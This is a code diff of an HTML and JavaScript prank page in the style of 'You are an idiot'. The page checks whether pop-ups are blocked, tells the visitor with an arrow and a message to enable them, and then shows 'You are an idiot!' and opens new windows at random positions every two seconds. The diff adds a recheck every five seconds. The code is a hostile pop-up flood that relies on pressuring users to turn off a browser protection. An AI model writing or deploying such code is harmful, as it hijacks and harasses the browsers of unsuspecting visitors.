@@ -35,33 +35,30 @@
       0% { transform: translateX(-10px); }
       100% { transform: translateX(10px); }
     }
-    #enable-popup-btn {
+    #message {
       display: none;
-      background-color: yellow;
-      color: black;
-      border: none;
-      padding: 20px;
       font-size: 1.5rem;
-      cursor: pointer;
-      font-weight: bold;
+      margin-top: 20px;
+      color: white;
     }
     #idiot-message {
       display: none;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
   <div id="arrow">↗️</div>
-  <button id="enable-popup-btn" onclick="enablePopups()">Enable Pop-ups</button>
+  <div id="message">Please enable pop-ups to continue</div>
   <div id="idiot-message">You are an idiot!</div>
 
   <script>
-    // Detect if pop-ups are blocked
+    // Function to check if pop-ups are blocked
     function checkPopupBlocked() {
       const testWindow = window.open('', '', 'width=1,height=1');
       if (!testWindow || testWindow.closed) {
         document.getElementById('arrow').style.display = 'block';  // Show the arrow if pop-ups are blocked
-        document.getElementById('enable-popup-btn').style.display = 'block';  // Show the button to enable pop-ups
+        document.getElementById('message').style.display = 'block';  // Show the message to enable pop-ups
 
         // Position the arrow to point where the user typically needs to enable pop-ups
         document.getElementById('arrow').style.position = 'absolute';
@@ -70,17 +67,9 @@
         document.getElementById('arrow').style.transform = 'translateX(-50%)'; // Adjust to center exactly
       } else {
         testWindow.close();  // Close the test window if pop-ups are allowed
-        document.getElementById('idiot-message').style.display = 'block'; // Show the message
+        document.getElementById('idiot-message').style.display = 'block'; // Show the "You are an idiot!" message
         setInterval(abrirMasVentanas, 2000); // Start opening multiple pop-ups every 2 seconds
       }
-    }
-
-    // Enable pop-ups manually by opening a new window
-    function enablePopups() {
-      window.open('popup.html', '_blank', 'width=400,height=300'); // Open a single pop-up to enable them
-      document.getElementById('arrow').style.display = 'none'; // Hide the arrow
-      document.getElementById('idiot-message').style.display = 'block'; // Show the "You are an idiot!" message
-      setInterval(abrirMasVentanas, 2000); // Start opening multiple pop-ups every 2 seconds
     }
 
     // Function to open more windows at random positions
@@ -99,8 +88,9 @@
       }
     }
 
-    // Check if pop-ups are blocked when the page loads
+    // Check if pop-ups are blocked initially and every 5 seconds
     checkPopupBlocked();
+    setInterval(checkPopupBlocked, 5000);  // Check again every 5 seconds
   </script>
 </body>
 </html>
